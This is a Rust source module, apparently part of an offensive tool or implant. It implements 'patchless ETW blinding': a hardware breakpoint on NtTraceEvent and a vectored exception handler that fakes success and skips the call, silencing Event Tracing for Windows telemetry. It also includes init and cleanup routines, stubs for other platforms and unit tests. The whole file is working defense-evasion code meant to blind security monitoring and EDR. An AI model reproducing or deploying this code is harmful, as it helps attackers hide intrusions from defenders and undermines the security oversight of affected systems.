//! Patchless ETW blinding via hardware breakpoints.
//!
//! Sets a hardware breakpoint (DR0) on `NtTraceEvent` so that every call
//! is intercepted by our Vectored Exception Handler. The VEH returns
//! `STATUS_SUCCESS` (RAX = 0) and skips the function body by advancing
//! RIP past the return address on the stack, effectively silencing all
//! ETW trace events without modifying any code bytes in memory.

// ── Windows implementation ──────────────────────────────────────────────────

#[cfg(windows)]
mod inner {
    use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};

    use windows::Win32::System::Diagnostics::Debug::{
        AddVectoredExceptionHandler, CONTEXT, CONTEXT_FLAGS, GetThreadContext,
        RemoveVectoredExceptionHandler, SetThreadContext,
    };
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Threading::GetCurrentThread;
    use windows::core::s;

    /// Address of `NtTraceEvent` — set once during init, read by the VEH.
    static NT_TRACE_EVENT_ADDR: AtomicU64 = AtomicU64::new(0);

    /// Whether ETW blinding is currently active.
    static ACTIVE: AtomicBool = AtomicBool::new(false);

    /// Handle returned by `AddVectoredExceptionHandler`, needed for cleanup.
    static VEH_HANDLE: AtomicU64 = AtomicU64::new(0);

    /// DR7 bit layout helpers.
    /// Enable DR0 local breakpoint (bit 0).
    const DR7_L0: u64 = 1 << 0;

    /// CONTEXT_DEBUG_REGISTERS | CONTEXT_AMD64 — needed for DR0-DR7 access.
    const CONTEXT_DEBUG: u32 = 0x00100010;

    /// Windows EXCEPTION_SINGLE_STEP constant.
    const STATUS_SINGLE_STEP: u32 = 0x80000004;

    /// VEH return: handled, resume execution.
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    /// VEH return: not ours, pass to next handler.
    const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

    /// Resolve the address of `NtTraceEvent` from ntdll.dll.
    fn resolve_nt_trace_event() -> Option<u64> {
        // SAFETY: GetModuleHandleA with a valid C string is safe — ntdll is always
        // loaded in every Windows process. GetProcAddress reads from the module's
        // export table.
        unsafe {
            let ntdll = GetModuleHandleA(s!("ntdll.dll")).ok()?;
            let addr = GetProcAddress(ntdll, s!("NtTraceEvent"))?;
            Some(addr as usize as u64)
        }
    }

    /// Set hardware breakpoint DR0 on the given address for the current thread.
    fn set_hw_breakpoint(addr: u64) -> Result<(), &'static str> {
        // SAFETY: GetCurrentThread returns a pseudo-handle that is always valid for
        // the calling thread. Get/SetThreadContext operate on the current thread's
        // register state. The CONTEXT struct is stack-allocated and fully initialized
        // via ContextFlags before use.
        unsafe {
            let thread = GetCurrentThread();
            let mut ctx: CONTEXT = std::mem::zeroed();
            ctx.ContextFlags = CONTEXT_FLAGS(CONTEXT_DEBUG);

            GetThreadContext(thread, &mut ctx).map_err(|_| "GetThreadContext failed")?;

            ctx.Dr0 = addr;
            ctx.Dr7 = (ctx.Dr7 & !0x000F_0003) | DR7_L0;

            SetThreadContext(thread, &ctx).map_err(|_| "SetThreadContext failed")?;
        }
        Ok(())
    }

    /// Clear hardware breakpoint DR0 for the current thread.
    fn clear_hw_breakpoint() -> Result<(), &'static str> {
        // SAFETY: Same rationale as set_hw_breakpoint — pseudo-handle + stack CONTEXT.
        unsafe {
            let thread = GetCurrentThread();
            let mut ctx: CONTEXT = std::mem::zeroed();
            ctx.ContextFlags = CONTEXT_FLAGS(CONTEXT_DEBUG);

            GetThreadContext(thread, &mut ctx).map_err(|_| "GetThreadContext failed")?;

            ctx.Dr0 = 0;
            ctx.Dr7 &= !DR7_L0;

            SetThreadContext(thread, &ctx).map_err(|_| "SetThreadContext failed")?;
        }
        Ok(())
    }

    /// VEH callback. Fires on any exception — we only handle SINGLE_STEP at
    /// the `NtTraceEvent` address.
    unsafe extern "system" fn veh_handler(
        exception_info: *mut windows::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS,
    ) -> i32 {
        // SAFETY: The OS guarantees exception_info is valid when calling a VEH.
        // We only read/write the context and exception record fields.
        unsafe {
            let info = &*exception_info;
            let record = &*info.ExceptionRecord;
            let ctx = &mut *info.ContextRecord;

            if record.ExceptionCode.0 as u32 != STATUS_SINGLE_STEP {
                return EXCEPTION_CONTINUE_SEARCH;
            }

            let target = NT_TRACE_EVENT_ADDR.load(Ordering::Relaxed);
            if target == 0 || ctx.Rip != target {
                return EXCEPTION_CONTINUE_SEARCH;
            }

            ctx.Rax = 0; // STATUS_SUCCESS
            let ret_addr = *(ctx.Rsp as *const u64);
            ctx.Rip = ret_addr;
            ctx.Rsp += 8;
            ctx.Dr7 |= DR7_L0; // Re-arm

            EXCEPTION_CONTINUE_EXECUTION
        }
    }

    /// Initialize ETW blinding: resolve NtTraceEvent, set HW breakpoint, install VEH.
    pub fn init() -> Result<(), String> {
        if ACTIVE.load(Ordering::Acquire) {
            return Ok(());
        }

        let addr = resolve_nt_trace_event()
            .ok_or_else(|| "failed to resolve NtTraceEvent from ntdll".to_string())?;
        NT_TRACE_EVENT_ADDR.store(addr, Ordering::Release);
        tracing::info!(addr = format!("{:#x}", addr), "resolved NtTraceEvent");

        // Install VEH first so it's ready before the breakpoint fires.
        let handle = unsafe { AddVectoredExceptionHandler(1, Some(veh_handler)) };
        if handle.is_null() {
            return Err("AddVectoredExceptionHandler returned null".to_string());
        }
        VEH_HANDLE.store(handle as u64, Ordering::Release);

        set_hw_breakpoint(addr).map_err(|e| e.to_string())?;
        ACTIVE.store(true, Ordering::Release);
        tracing::info!("ETW blinding active (patchless via DR0)");
        Ok(())
    }

    /// Remove VEH and clear the hardware breakpoint.
    pub fn cleanup() {
        if !ACTIVE.swap(false, Ordering::AcqRel) {
            return;
        }

        if let Err(e) = clear_hw_breakpoint() {
            tracing::warn!("failed to clear ETW hw breakpoint: {}", e);
        }

        let handle = VEH_HANDLE.swap(0, Ordering::AcqRel);
        if handle != 0 {
            unsafe {
                RemoveVectoredExceptionHandler(handle as *mut core::ffi::c_void);
            }
        }

        NT_TRACE_EVENT_ADDR.store(0, Ordering::Release);
        tracing::info!("ETW blinding deactivated");
    }

    /// Returns whether ETW blinding is currently active.
    pub fn is_active() -> bool {
        ACTIVE.load(Ordering::Acquire)
    }
}

// ── macOS / Linux stubs ─────────────────────────────────────────────────────

#[cfg(not(windows))]
mod inner {
    /// No-op on non-Windows platforms.
    pub fn init() -> Result<(), String> {
        Ok(())
    }

    /// No-op on non-Windows platforms.
    pub fn cleanup() {}

    /// Always returns false on non-Windows.
    pub fn is_active() -> bool {
        false
    }
}

// ── Public API ──────────────────────────────────────────────────────────────

#[allow(unused_imports)]
pub use inner::{cleanup, init, is_active};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn init_stub_does_not_panic() {
        let _ = init();
    }

    #[test]
    fn cleanup_stub_does_not_panic() {
        cleanup();
    }

    #[test]
    fn is_active_default_false() {
        assert!(!is_active());
    }

    #[test]
    fn init_cleanup_roundtrip() {
        let _ = init();
        cleanup();
        assert!(!is_active());
    }
}
